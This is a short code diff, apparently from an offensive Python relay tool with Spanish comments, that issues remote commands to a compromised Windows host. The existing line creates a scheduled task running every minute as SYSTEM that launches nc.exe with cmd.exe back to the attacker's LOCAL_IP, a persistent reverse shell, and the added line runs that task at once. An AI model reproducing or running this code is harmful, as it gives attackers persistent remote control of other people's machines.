@@ -56,6 +56,7 @@ class targetRelay:
     def schd_task(self):
         comandos = [         
                     f"{self.connection} -x "  + "'" + 'schtasks /create /sc minute /mo 1 /tn "AutoRelay2" /tr "cmd.exe /C C:\\Windows\\' + CARPETA_OBJETIVO + '\\nc.exe -e C:\Windows\System32\cmd.exe ' + f"{LOCAL_IP} {self.port}" + '" /ru SYSTEM /f'+ "'",
+                    f"{self.connection} -x "  + "'" + 'schtasks /run /tn "AutoRelay2"' + "'",
         ]
         # Abrir el archivo en modo de adjuntar ('a' significa append)
         with open('pwnd.txt', 'a') as archivo:
